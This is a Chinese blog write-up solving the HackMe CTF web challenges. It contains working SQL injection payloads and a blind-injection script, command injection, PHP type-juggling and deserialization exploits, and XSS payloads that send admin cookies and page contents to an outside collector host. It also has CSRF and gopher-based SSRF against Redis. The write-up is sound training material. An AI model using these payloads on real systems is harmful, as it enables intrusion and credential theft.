---
layout: post
title: "HackMeCTF-web部分wp"
tags: [blog]
author: wqpw
---

平台网址：[https://hackme.inndy.tw/](https://hackme.inndy.tw/) 介绍说`This is a platform for CTF beginner! Enjoy your CTF :)`，随便玩玩~

### hide and seek

这题啊，老经典了，很多CTF平台（比如南京邮电）web的第一个题都是这种，具体就不说了。

### guestbook

题目提示说用sqlmap，但这有什么意思呢？想日站首先就要学sql，而且网上各种资料多如牛毛。首先发送个新的post，然后在主页源代码里看到`?mod=read&id=124`，用`and 1=1`和`and 1=2`简单测试可以发现id存在数字型sql注入，这里最简单的方法就是union注入。

大概流程：

```sql
?mod=read&id=-1 order by 4 正常
?mod=read&id=-1 order by 5 错误，说明后端sql查询有4个列
?mod=read&id=-1 union select 1,2,3,4 得到输出点2,3,4。注意这里把id改成-1(不存在的id)是为了让union之前的结果为空集，这样我们想要的东西就顶上去了。
?mod=read&id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()
然后得到flag表的列名
?mod=read&id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='flag'
得到长得很奇怪的flag
?mod=read&id=-1 union select 1,2,3,group_concat(flag) from flag
```

### LFI

提示了LFI(Local File Inclusion 本地文件包含), 和php://filter伪协议，可以参考[这个](https://xz.aliyun.com/t/5535)

最后利用`?page=php://filter/read=convert.base64-encode/resource=文件路径`就可以得到flag。

### homepage

提示看主页代码，直接秒了。一种很常见的网站彩蛋，百度也有（你在电脑前看这段文字...）。

### ping

题目给了源代码，要考我们远程命令执行(RCE)。
限制了长度和一堆特殊符号，乍一看比较难受，不过反引号没过滤而且把标准错误重定向到了标准输出，所以&#x60;tail fla*&#x60;秒了（随便换个没在黑名单里可以读文件的命令，用通配符绕过flag，然后ping会报错）。

当然这种题普遍有很多姿势，有兴趣可以自己研究研究。
可以参考[Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection).

### scoreboard

打开看发现是scoreboard...看提示应该不难，然后flag果然藏在头er里，秒了。

### login as admin 0 和 0.1

首先点主页的`Source Code`查看源代码，简化一下大概流程。

```php
<?php

// 提示了表结构
// user -> id, user, password, is_admin

function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}

//对整个_POST过来的参数做了过滤。
$_POST = array_map(safe_filter, $_POST);

$connection_string = sprintf('mysql:host=%sdbname=%s;charset=utf8mb4', DB_HOST,DB_NAME);
//连接数据库，拼接sql
$sql = sprintf("SELECT * FROM `user` WHERE`user` = '%s' AND `password` = '%s'",
    $_POST['name'],
    $_POST['password']
);
//进行查询
}
?>
```

对我们发送的参数首先全转换成小写，然后匹配了几个敏感字串，如果有的话直接不给查询。

如果见多识广经验丰富看过的资料多的话，看到safe_filter里的`str_replace("'", "\\'", $str)`就应该立刻想到利用`'`变成了`\'`所以在前面再加个`\`就可以把单引号逃逸掉了。

然后发送`name=%df%5c' or user=0x61646d696e--+&password=guest`（用hex编码规避'admin'）得到第一个flag和一个提示`flag2 in the database!`

注意到输出点看源码是第二个列（前面给了表结构）`<h3>Hi, <?=htmlentities($user->user)?></h3>`，还是用`union select`的方式获取数据。

```sql
首先随便排个序把输出的用户名换成我们要查的东西
name=%df%5c' or user=0x61646d696e union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 order by is_admin desc--+&password=guest
```

后面就按一般流程（表名，列名，数据）得到flag2。

### login as admin 1 和 1.2

还是sql注入，不过加大了难度，同样给了源码和两个flag。
主要改了safe_filter函数，里面把空格干掉了，但众所周知有很多方法（详情可看sqlmap自带的的tamper）可以代替sql语句里的空格比如改成换行(%0a)，然后输出没了，只有判断is_admin给第一个flag。。。这里我们换个注入点，用name来逃逸单引号。

PS：遇到比较麻烦的注入最好还是先本地测试一下注入的sql语句能不能用

`name=%5c&password=%0aor%0a1%0aunion%0aselect%0a1,1,1,1%0aorder%0aby%0a1%23`

flag2还是在数据库里，只能盲注。然而不想写脚本，上sqlmap整整

`python sqlmap.py -u "https://hackme.inndy.tw/login1/" --data "name=\&password=*" --prefix "or 2 " --suffix "#" --tamper space2mysqldash --dbms=mysql --level 5 --random-agent`

成了，不过sqlmap没识别出bool盲注只有时间盲注，虽然比较慢但可以去休息下......

等了半天终于注出来，这表名字段名全是32位md5...

最后还是自己写了：

```python
#!/usr/bin/env python2
import requests
url = 'https://hackme.inndy.tw/login1/'
#sql = 'select table_name from information_schema.tables where table_schema=database() limit 0,1'
#res=0bdb54c98123f5526ccaed982d2006a9
#sql = 'select column_name from information_schema.columns where table_name=0x3062646235346339383132336635353236636361656439383264323030366139 limit 1,1'
#res=4a391a11cfa831ca740cf8d00782f3a6
sql = 'select 4a391a11cfa831ca740cf8d00782f3a6 from 0bdb54c98123f5526ccaed982d2006a9'
#FLAG{W0W, You found the c ......
payload1 = 'or 1 and length(({0}))={1}#'
length = 0

while True:
    data = {'name':'\\', 'password':payload1.format(sql, length)}
    data['password'] = data['password'].replace(' ', '\n')
    r = requests.post(url, data=data)
    if 'Hi' in r.text:
        break
    length += 1

print length
payload2 = 'or 1 and ascii(mid(({0}),{1},1))<{2}#'
res = ''
#按速度来看二分法<位运算<遍历
for i in range(0, length):
    l = 0; h = 255;
    while l < h:
        m = (l + h) >> 1
        data = {'name':'\\', 'password':payload2.format(sql,i+1,m)}
        data['password'] = data['password'].replace(' ', '\n')
        r = requests.post(url, data=data)
        if 'Hi' in r.text:
            h = m
        else:
            l = m + 1
    res += chr(l - 1)
    print res
```

### login as admin 3

首先来简化一下这个题的代码：

```php
<?php

$secret = "xxxxxx"; //这个密钥我们很难知道
$u = json_decode(base64_decode($_COOKIE['user']), true);

//关键值打印出来看看
var_dump($u);
echo "<br>";
echo hash_hmac('sha512', $u['data'], $secret)."<br>";
var_dump(hash_hmac('sha512', $u['data'], $secret) == $u['sig']);
echo "<br>";
var_dump(json_decode($u['data'], true));
echo "<br>";

if(hash_hmac('sha512', $u['data'], $secret) == $u['sig']) {
    $data = json_decode($u['data'], true);
    $user['admin'] = $data[1];
    if ($user['admin']) {
        echo "flag{Ok}<br>";
    }
}

//方便我们本地自己构造
$u['sig'] = 'test';
$u['data'] = '{"0":"admin","1":"test"}';
echo base64_encode(json_encode($u))."<br/>";
```

显然我们需要通过`hash_hmac('sha512', $u['data'], $secret) == $u['sig']`，而且让`if($u['data'][1])`为真。

首先翻php官方手册查一下`hash_hmac`函数

```text
hash_hmac — 使用 HMAC 方法生成带有密钥的哈希值
第一个参数是要用的算法，第二个是计算的数据，第三个是生成生成哈希时所使用的密钥。
```

显然我们修改`$u['data'][1]`为真后题目网站再次生成的哈希不可能等于原先的`$u['sig']`。

这时我们要注意到它比较时用的是`==`而不是`===`。

```php
$a == $b 等于 TRUE，如果类型转换后 $a 等于 $b。  
$a === $b 全等 TRUE，如果 $a 等于 $b，并且它们的类型也相同。
```

官方还有个[PHP 类型比较表](https://www.php.net/manual/zh/types.comparisons.php)

总之要用到的是...

![1](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/3277ebc6dbc5b7ae0da1799255c49031.png)

所以呢我们这样搞：

```text
$u['sig'] = 0;
$u['data'] = '{"0":"admin","1":"bool为真的随机字符串，这样才看得到flag"}';
```

然后碰运气`hash_hmac('sha512', $u['data'], $secret) == $u['sig']`，哪次hash_hmac返回的字符串不是数字开头就绕过去了。

首先生成payload

```php
<?php
$u['sig'] = 0;
for ($i = 97; $i <= 107; $i++)
{
    for ($k = 107; $k <= 117; $k++)
    {
        $u['data'] = '{"0":"admin","1":"2'.chr($i).chr($k).'"}';
        echo base64_encode(json_encode($u))."<br/>";
    }
}
```

保存一下，然后用burpsuite的intruder爆破。

![2](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/fd35dc80a5d3204a3e5cbed409b3ee75.png)

### login as admin 4

这个题演示了一个很经典的漏洞。

```php
if($_POST['name'] === 'admin') {
    if($_POST['password'] !== $password) {
        header('Location: ./?failed=1');
    }
}
echo $flag;
```

判断密码不对后要求浏览器跳转，但因为程序执行header函数之后并没有退出(`exit;`)，实际上后面的程序还是执行了。

还有一种是前端用js跳转并且程序也没有退出，后面也没有判断权限和是否登录啥的，也是一样的效果。也算是一种越权吧。

让我想起来两年前某天早上闲着没事，随手就进了我们学校新闻网站的后台逛了逛，用的也是这种漏洞（授权测试）。

### Login as Admin 6

看代码，考点很明确，就是extract变量覆盖。直接发送`data={"username":"admin","admin":"admin","password":{},"users":{"admin":"1"}}`即可，这里顺便利用了`strcmp`的特性。可以本地研究下：

```php
<?php
highlight_file(__FILE__);
$data = json_decode($_POST['data'], true);
extract($data);
if($users[$username] && strcmp($users[$username], $password) == 0) {
    $user = $username;
}
if($user == 'admin')
echo "flag{Ok}";

$data = [];
$data['username']='admin';
$data['admin']='admin';
$data['password']='admin';
$data['users']['admin']='admin';
echo json_encode($data);
?>
```

更多资料可以参考[PHP代码审计分段讲解](https://github.com/bowu678/php_bugs)

### login as admin 7

很经典的md5弱类型比较绕过，发送`name=admin&password=240610708`。原理就是`md5(240610708)`是`0e`开头，和`'00000000000000000000000000000000'`用`==`比较按科学计数法转换成0，都是0所以相等。

### login as admin 8 和 8.1

登录guest查看cookie，按照题目设置的cookie的值反推出Session类的结构，然后构造对象注入

```php
<?php
class Session
{
    private $debug=true;
    private $debug_dump="index.php";
    private $data=[];
    public $user="admin";
    public $pass="admin";
    public $is_admin=true;
}
$a = urlencode(serialize(new Session()));
echo $a;
echo "<br>";
echo hash('sha512', urldecode($a));
?>
```

`login8cookie`和`login8sha512`都要改。

然后把`debug`改成`true`，`debug_dump`改成其他文件查看代码，得到另一个flag。

### dafuq-manager 1,2,3

一个web版的文件管理器，guest/guest登陆进去，然后把cookie的show_hidden值改为yes看到第一个flag。

要得到第二个flag需要登录成admin，比较尴尬的是guest那里已经有前人的shell可以用了（点编辑可以看到源码），然后我全删了（

我们还是按题目要求流程来一下~

guest的目录那里给了题目的源码，不过没必要细看，直接黑盒审计。很简单就可以找到编辑文件那里可以遍历，读取`../../.config/.htusers.php`得到管理员权限（md5可以在somd5等网站解密），flag2就在管理员的文件里。

然后要求getshell拿到`$WEBROOT/flag3`

翻了下代码，找到一个自带的后门`/core/fun_debug.php`

```php
<?php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
function do_debug() {
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) {
            die('2bad');
        }
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    } else {
        show_error('What does the fox say?');
    }
}
```

有个比较$dir直接用数组绕过去`dir[]=`。
然后按照代码构造命令即可。

```php
<?php
$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
echo make_command('$_GET[0]($_POST[1]);');
```

得到一个shell: `?action=debug&dir[]=&command=JF9HRVRbMF0oJF9QT1NUWzFdKTs=.6422d88e7b05afea15a9fed7c3e1e65e4be276ea2f23b16242712d7b2885c64c&0=assert`

查看phpinfo();发现禁了一堆没多大用的函数，读目录发现flag3不能直接读，要运行题目给的`flag3/meow`来读flag。

所以直接system执行meow，结束。

### wordpress 1,2

首先在Backup File那里下载源码。还有提示说`Something strange is hidding in the source code, find it.This challenge does not require to exploit any thing.`

有点诡异。

在目录下执行`grep -r FLAG`啥也没有，换成`grep -r game`找到了`wp-content/plugins/core.php`

```php
function print_f14g()
{
    $h = 'm'.sprintf('%s%d','d',-4+9e0);
    if($h($_GET['passw0rd']) === '5ada11fd9c69c78ea65c832dd7f9bbde') {
        if(wp_get_user_ip() === '127.0.0.1') {
            eval(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET['passw0rd'].AUTH_KEY), base64_decode('zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='), MCRYPT_MODE_CBC, $h($_GET['passw0rd'].AUTH_SALT)));
        } else {
            die('</head><body><h1>Sorry, Only admin from localhost can get flag');
        }
    }
}
add_action('wp_head', 'print_f14g');
//wp_get_user_ip在wp-includes/functions.php
function wp_get_user_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return $ip;
}
```

md5破解出来是`cat flag`，然后请求时把XFF改成127.0.0.1在网页源代码`<head></head>`标签的注释里得到第一个flag。顺便提示了他用的主题里有后门。

然后这找第二个flag的思路，让我想起了多年前刚开始学黑网站时各种瞎怼。

首先找下它的主题`/wp-content/themes/`，打开文件夹后知道了主题是`astrid`。因为文件太多了所以我从网上随便找了一个`astrid`，弄下来用[meld](http://meldmerge.org/)比较了一下文件。然后可以找到一个很奇怪的地方：

```php
// /wp-content/themes/astrid/template-parts/content-search.php 第26行
<!-- debug:<?php var_dump($wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}); ?> -->
```

按照这个文件里说明的功能，这里的`debug`会在搜索的结果页输出，默认是`$wp_query->post->post_type`

![3](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/61127821d4ed8250e9005eb41c993f8c.png)

翻一下源码找到对应的`wp-includes/class-wp-post.php`的`WP_Post`类，还有一堆`post_`开头的成员：

```php
public $post_author = 0;
public $post_date = '0000-00-00 00:00:00';
public $post_date_gmt = '0000-00-00 00:00:00';
public $post_content = '';
public $post_title = '';
public $post_excerpt = '';
public $post_status = 'publish';
public $post_password = '';
public $post_name = '';
public $post_modified = '0000-00-00 00:00:00';
public $post_modified_gmt = '0000-00-00 00:00:00';
public $post_content_filtered = '';
public $post_parent = 0;
public $post_type = 'post';
public $post_mime_type = '';
```

![4](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/8b4bc5665c65aa832741e1c12cb3b52d.png)

没毛病，然而这有什么用呢？就输出个搜索出来的文章对应的post类实例的一些成员变量，有个锤子用。这是个锤子后门。

![2333](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/7d1e79d50ceb2c480ea86aa1b12bc227.jpg)

然后冷静下来想想，这个后门到底指什么，能看到不该看的东西也算后门吧。

然后前面列了一堆成员变量，里面确实不应该被看到的只有`post_password`。

查了一下发现这玩意是受密码保护的文章的密码，所以先找找有没有受密码保护的文章。

直接用burp遍历`/archives/1`到`/archives/100`，可以发现...

![5](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/40522bc29d44ce7455739fb1e2e198f0.png)

尝试搜索一下

![6](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/0d632c7c0135bbf1f41e971542dae885.png)

发现带保护的文章不能被搜索，那这后门不是废了，不能搜索到就不能让它输出`post_password`。

满脸懵逼，然后开始瞎搞，结果发现所有的页面都可以用`?s=xxx`进行搜索，例如：

![7](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/93745951258884d71c1e9dc1ea5126a0.png)

内容中存在`Backup`

![8](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/8a615eacaac0d5cb8f73d5d6f2b2cb29.png)

然而对于被密码保护的文章并没有什么用。

然后又发现可以看某个月的文章列表，尝试搜索下

![9](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/1b892fe429f4fdc9993bb0d8cc5e5b73.png)

![10](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/35b662ca6589da87e525cb2021b8f374.png)

还是不行。

不过最重要的是这个页面至少把有这篇文章列出来了。

<font style="color:red">胡乱分析思考一下，我们要利用提供的后门查看这篇文章的密码，需要进入搜索的流程但又没有真正的进行搜索？或者是让程序直接返回全部？这样FLAG2这篇文章在结果中就不会被去掉，后门也能输出。</font>

所以搜索空字符串试试...

![11](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/919695db77e7d28db9cc639d415328ba.png)

这个就是基于经验的直觉。

然后利用后门`?s=&debug=password`得到文章的密码，查看文章得到flag2。

具体原理需要调试源码才能知道，懒得搞了。

### webshell

打开题目查看页面源代码，给了我们一个php的webshell的代码，按套路首先把eval改成print本地看看具体执行了个啥：

```php
 <?php
  function run()
  {
    if (isset($_GET['cmd']) && isset($_GET['sig'])) {
      $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string) $_GET['cmd'];
      $key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
      $sig = hash_hmac('SHA512', $cmd, $key);
      if ($sig === (string) $_GET['sig']) {
        header('Content-Type: text/plain');
        return !!system($cmd);
      }
    }
    return false;
  }
  function fuck()
  {
    print(str_repeat("\n", 4096));
    readfile($_SERVER['SCRIPT_FILENAME']);
  }
  run() ?: fuck();
```

题目还给了我们robots.txt，ip.php（返回我们的ip也就是REMOTE_ADDR）所以我们照着逻辑写个脚本中转一下，方便执行命令，最后得到flag。

```php
<?php
$cmd = $_GET['cmd']?:"ls -a";
function get_ip() {
    $ip_addr = "https://webshell.hackme.inndy.tw/ip.php";
    $ch = curl_init($ip_addr);
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_SSL_VERIFYPEER => 0
    ));
    return curl_exec($ch);
}
function run($cmd) {
    $shell_addr = "https://webshell.hackme.inndy.tw/";
    $host = "webshell.hackme.inndy.tw";
    $ip = get_ip();
    $cmd = hash('SHA512', $ip) ^ $cmd;
    $ua = "wow";
    $key = $ua . sha1($host);
    $sig = hash_hmac('SHA512', hash('SHA512', $ip) ^ $cmd, $key);
    $ch = curl_init($shell_addr."?cmd=".urlencode($cmd)."&sig=".$sig);
    curl_setopt_array($ch, array(
        CURLOPT_USERAGENT => $ua,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_SSL_VERIFYPEER => 0,
    ));
    return curl_exec($ch);
}
echo run($cmd);
?>
```

### command-executor

遇到这种看起来有一堆功能的网站，要有耐心慢慢测试。

![12](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/abc110aa1645a836706b7b957435f1f9.png)

List Files可以目录遍历，注意到几个文件名。

发现其他几个url是

```text
https://command-executor.hackme.inndy.tw/index.php?func=cmd
https://command-executor.hackme.inndy.tw/index.php?func=untar
https://command-executor.hackme.inndy.tw/index.php?func=man
```

所以猜测可能存在文件包含漏洞，试试php伪协议

![13](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/5b8e1257f23fb1085d40ed337ac7c1b1.png)

返回`ls.php`base64编码的源码，确定。

利用目录遍历找到前人的shell

![14](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/f891e0a78a40004e65acff86c4479bc8.png)

解码得`<?php eval($_POST[hp]);?>`

利用index.php的文件包含漏洞运行webshell读取文件，发现`/var/tmp`下基本都是前人搞到的`flag`，结束。

然后我就把shell和flag全删了（

正常的做法是利用CVE-2014-6271，太老了这漏洞完全没想到。可以参考[https://www.cnblogs.com/bmjoker/p/9537667.html](https://www.cnblogs.com/bmjoker/p/9537667.html)

### xssme

XSS的题目基本都会提示管理员会查看我们发的东西啥的，或者是给个类似给后台留言之类的功能，目标一般是盗窃管理员的cookie，比较难的就是要利用xss攻击只有管理员能访问的服务之类或者xss本身就很难（各种绕过，比如csp，浏览器的xss保护啥的）。

随便注册个账号，然后登录，给管理员发邮件。邮件内容可以XSS，可以通过已发送进行确认。

md5验证码简单写个脚本跑一下就行

```python
from hashlib import md5
from random import sample
import string
cst = string.ascii_letters+string.digits
while True:
    a = "84640dd03616a7d9"+''.join(sample(cst, 6))
    if md5(a).hexdigest()[:5] == "00000":
        print a[-6:]
        break
```

经过测试过滤了许多关键字

```text
Bad words found: ), }, <script, <video, <audio, <iframe, <frame, <link , eval, window., document.write, innerhtml,  onerror,  onabort,  onload,......一堆事件, new Function
```

然后各种姿势试了好久，网上别人做过成功的exp都拿来用了就是打不到cookie。最后分段才打到cookie。

```html
<img
onerror=location['href']='http://your.ceye.io/3?'+document['coo'+'kie'][0]++document['coo'+'kie'][1]+document['coo'+'kie'][2]+document['coo'+'kie'][3]+document['coo'+'kie'][4]+document['coo'+'kie'][5]+document['coo'+'kie'][6]+document['coo'+'kie'][7]+document['coo'+'kie'][8]+document['coo'+'kie'][9]+document['coo'+'kie'][10]+document['coo'+'kie'][11]+document['coo'+'kie'][12]+document['coo'+'kie'][13]+document['coo'+'kie'][14]+document['coo'+'kie'][15]+document['coo'+'kie'][16]+document['coo'+'kie'][17]+document['coo'+'kie'][18]+document['coo'+'kie'][19]+document['coo'+'kie'][20]+document['coo'+'kie'][21]+document['coo'+'kie'][22]+document['coo'+'kie'][23]+document['coo'+'kie'][24]+document['coo'+'kie'][25]+document['coo'+'kie'][26]+document['coo'+'kie'][27]+document['coo'+'kie'][28]+document['coo'+'kie'][29]+document['coo'+'kie'][30]+document['coo'+'kie'][31]+document['coo'+'kie'][32]+document['coo'+'kie'][33]+document['coo'+'kie'][34]+document['coo'+'kie'][35]+document['coo'+'kie'][36]+document['coo'+'kie'][37]+document['coo'+'kie'][38]+document['coo'+'kie'][39]+document['coo'+'kie'][40]+document['coo'+'kie'][41]+document['coo'+'kie'][42]+document['coo'+'kie'][43]+document['coo'+'kie'][44]+document['coo'+'kie'][45]+document['coo'+'kie'][46]+document['coo'+'kie'][47]+document['coo'+'kie'][48]+document['coo'+'kie'][49]+document['coo'+'kie'][50] src=1 />
```

得到第一个flag

想不通为什么这个打不到cookie。

```html
location['href']='http://your.ceye.io/3?'+document['coo'+'kie']
```

![16](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/c04001fa571d642fc483254b3897244a.png)

接下来读一下管理员页面的源码，注意到所有的事件都是`空格onxxx`这样被拦截，那么利用浏览器的特性，空格可以换成换行来绕过。同时在事件里可以用html实体编码绕过括号，eval改用用new Function绕过，在利用base64编码一下最后要执行的代码。

```html
d</textarea>'"><img src=x
onerror="new
Function&#40;atob&#40;'b3BlbignaHR0cDovL3lvdXJpcC8/Jytlc2NhcGUoZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpKQ=='&#41;&#41;&#40;&#41;">
```

在自己的服务器上接收到

```html
<nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex">
  <a class="navbar-brand" href="index.php">XSSRF</a>
  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="sendmail.php">Send Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="mailbox.php">Mailbox</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="sentmail.php">Sent Mail</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="setadmin.php">Set Admin</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="request.php">Send Request</a>
    </li>
  </ul>
  <ul class="navbar-nav ml-auto">
    <li class="nav-item">
      <span class="navbar-text">Hello, admin (Administrator)</span>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="logout.php">Logout</a>
    </li>
  </ul>
</nav>
```

利用ajax搞一下setadmin.php的源码

```html
btoa("a=new XMLHttpRequest();a.open('GET','setadmin.php',false);a.send();open('http://yourip/?'+escape(a.responseText));")
然后
d</textarea>'"><img src=x
onerror="new
Function&#40;atob&#40;'结果放这里'&#41;&#41;&#40;&#41;">
```

可以看到有个表单，用来设置管理员

```html
      <form action="/setadmin.php" method="POST">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" name="username" class="form-control" id="username" aria-describedby="username" placeholder="Username">
        </div>

        <button class="btn btn-primary">Give Admin Access</button>
      </form>
```

接下来，准确地说是利用CSRF把我们自己弄成管理员。

```javascript
//管理员执行
a=new XMLHttpRequest();
a.open('POST','setadmin.php',false);
a.setRequestHeader('Content-type','application/x-www-form-urlencoded');
a.send('username=用户名');
```

同样编码后换一下原来的就行

然后重新登录，发现...

![15](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/744b7584d040c1cd8e841382107e92cc.png)

然后改XFF啥的也没用，说明我被骗了。重新注册，读管理员页面的request.php。得到又一个表单

```html
<form action="/request.php" method="POST">
    <div class="form-group">
      <label for="url">URL</label>
      <textarea name="url"class="form-control" id="url"aria-describedby="url"placeholder="URL" rows="10"><textarea>
    </div>
    <button class="btn btn-primary">SendRequest</button>
</form>
```

然后这里存在SSRF（因为提示flag3在redis里，肯定要用ssrf来打），用file协议读config.php源码（robots.txt也有提示）

```javascript
a=new XMLHttpRequest();
a.open('POST','request.php',false);
a.setRequestHeader('Content-type','application/x-www-form-urlencoded');
a.send('url=file:///var/www/html/config.php');
b=new XMLHttpRequest();
b.open('POST','http://yourip:port/',false);
b.setRequestHeader('Content-type','application/x-www-form-urlencoded');
b.send('data='+a.responseText);
```

同样btoa()编码后换一下前面的paylaod

![17](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/cbb076a6ee1da90dd0bc1a5d5157f703.png)

然后就是ssrf用gopher协议打redis,config.php源码里给了端口和地址

```php
define('REDIS_HOST', 'localhost');
define('REDIS_PORT', 25566);
```

然后把前面的`a.send('url=file:///var/www/html/config.php');`改成`a.send('url=gopher://127.0.0.1:25566/_LRANGE flag 0 53');`

得到flag

![18](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/fdc096d90284695380e81c7cc99c1e52.png)

在用py处理一下就行

![19](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/cfc2d89e1d6bbb2a8c657de68d733ea1.png)

还可以参考下这个[https://www.anquanke.com/post/id/156377](https://www.anquanke.com/post/id/156377)

大概做了三天 = =  
总的来看题目质量确实不错，就是后端只涉及了php，不太够。虽然有的知识点比较简单，不过题目代码还给的挺长的，对新手来说是不错的锻炼。

![233](https://testt-1257276208.cos.ap-chengdu.myqcloud.com/bg/979600658e92bf171fe94da00bae98f9.jpg)